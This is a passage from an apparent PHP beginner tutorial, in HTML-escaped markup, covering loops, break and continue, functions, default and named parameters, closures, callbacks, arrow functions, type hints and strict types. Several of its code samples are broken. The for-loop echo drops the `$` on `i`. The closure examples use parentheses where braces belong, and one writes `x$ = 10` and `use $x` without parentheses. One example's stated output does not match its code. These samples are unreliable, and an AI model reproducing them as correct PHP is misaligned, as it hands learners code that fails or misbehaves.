&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'value : '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the code block will be executed 9 times.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#do-while-loop"&gt;
  &lt;/a&gt;
  “do while” loop
&lt;/h3&gt;

&lt;p&gt;Essentially the same principle as the “while” loop, but in this case the block of code will always execute at least once. The condition being tested only at the end of the code block.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'value : '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#the-for-loop"&gt;
  &lt;/a&gt;
  The “for” loop
&lt;/h3&gt;

&lt;p&gt;Used to execute a block of code a number of times defined by a condition.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"i value = "&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The parameter is divided into three sections, the first being the definition of the counter ($i = 0). Then the condition to respect to execute the block of code ($i &amp;lt; 20) and finally the code to execute at each iteration ($i++)&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#the-foreach-loop"&gt;
  &lt;/a&gt;
  The “foreach” loop
&lt;/h3&gt;

&lt;p&gt;The foreach function executes a block of code for each element of an array.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$names&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Shawn'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'John'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="k"&gt;foreach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$names&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The first parameter is the name of the array to browse, the second parameter represents the reference to the current element.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#break-and-continue"&gt;
  &lt;/a&gt;
  Break and Continue
&lt;/h3&gt;

&lt;p&gt;The break and continue statements are used to modify the loop&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;'&amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This loop will print the value of $i, only when the value is odd.&lt;/p&gt;

&lt;p&gt;If the value is even ($i % 2 === 0). So we ask the loop to do a &lt;strong&gt;continue&lt;/strong&gt; with the next value.&lt;/p&gt;

&lt;p&gt;It is possible to exit the loop at any time with the &lt;strong&gt;break&lt;/strong&gt; instruction&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;'&amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the loop will stop when $i will have 10 as value&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#functions"&gt;
  &lt;/a&gt;
  Functions
&lt;/h1&gt;

&lt;p&gt;In PHP there are several functions already pre-defined. It is also possible to create our own functions.&lt;/p&gt;

&lt;p&gt;Functions allow us to avoid repeating our code several times. They also allow us to divide our application into small pieces that are easier to maintain.&lt;/p&gt;

&lt;p&gt;The syntax for creating a function is quite simple&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello World'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we use the keyword “function” followed by the name of our function.&lt;/p&gt;

&lt;p&gt;Once our function has been created, it is possible to launch its execution&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It is possible to include one or more parameters to our function&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello'&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The launch of the function must include the parameters in the order they were declared&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Taylor'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;A default value can be assigned to a parameter which suddenly makes this parameter optional when calling the function.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'none'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello'&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// Mike none&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Note that parameters with a default value must absolutely be defined last.&lt;/p&gt;

&lt;p&gt;Since version 8 of PHP it is possible to launch a function by naming the parameters. The call is clearer and the order of the parameters does not have to be respected.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lastName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'Taylor'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;firstName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#return"&gt;
  &lt;/a&gt;
  Return
&lt;/h3&gt;

&lt;p&gt;Returns a value when calling the function.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'John'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Doe'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the function returns a concatenated string with first name and last name&lt;/p&gt;

&lt;p&gt;The echo function will display on the web page the value returned by the fullName() function&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#anonymous-functions-closure"&gt;
  &lt;/a&gt;
  Anonymous functions (closure)
&lt;/h3&gt;

&lt;p&gt;Allows the creation of functions without specifying their name. Here is an example :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Anonymous functions end with a semicolon; And they can't access the parent context variables.&lt;/p&gt;

&lt;p&gt;It is possible to pass a variable from the parent context with the statement &lt;strong&gt;use&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nv"&gt;$sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="nv"&gt;$x&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="kt"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// 35&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#callback-functions"&gt;
  &lt;/a&gt;
  Callback functions
&lt;/h3&gt;

&lt;p&gt;Callback functions are anonymous functions passed as parameters. here is an example&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'iPhone 12'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPhone 13'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPad'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iWatch'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="nv"&gt;$filtered_products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;array_filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$products&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;str_contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Phone'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="nb"&gt;print_r&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filtered_products&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// Array ( [0] =&amp;gt; iPhone 12 [1] =&amp;gt; iPhone 13 )&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the array_filter() function has an anonymous function as second parameter.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#arrow-functions"&gt;
  &lt;/a&gt;
  Arrow functions
&lt;/h3&gt;

&lt;p&gt;Allows the use of a shortcut syntax:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'iPhone 12'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPhone 13'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPad'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iWatch'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="nv"&gt;$filtered_products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;array_filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$products&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;fn&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;str_contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Phone'&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

&lt;span class="nb"&gt;print_r&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filtered_products&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Note that for the moment, the Arrow functions allow the execution of only one expression. Arrow functions are executed in the current context so they can use variables without having to use the &lt;strong&gt;use&lt;/strong&gt; statement.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#function-type-hint"&gt;
  &lt;/a&gt;
  Function Type Hint
&lt;/h3&gt;

&lt;p&gt;Note that functions can be typed (string, int, etc.). It is possible to define a type for each of the parameters and a type for the return value of the function&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;display&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="nv"&gt;$first&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="nv"&gt;$last&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$first&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$last&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the $first and $last parameters must be of type string as well as the return value.&lt;/p&gt;

&lt;p&gt;There are several other things to know about typed functions, we will come back to this later.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#strict-type"&gt;
  &lt;/a&gt;
  Strict Type
&lt;/h3&gt;

&lt;p&gt;Here is an example of a function with type&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'10'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// 30&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In this example the parameter $a is of type integer. However PHP does not return an error. The reason is that PHP will try to convert the string '10' to an integer. If the conversion is possible then no error is reported.&lt;/p&gt;

&lt;p&gt;There are times when you would like PHP to not allow this conversion and only execute if the parameter is really of the specified type. To do this you must add an instruction at the beginning of your file.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;declare&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strict_types&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

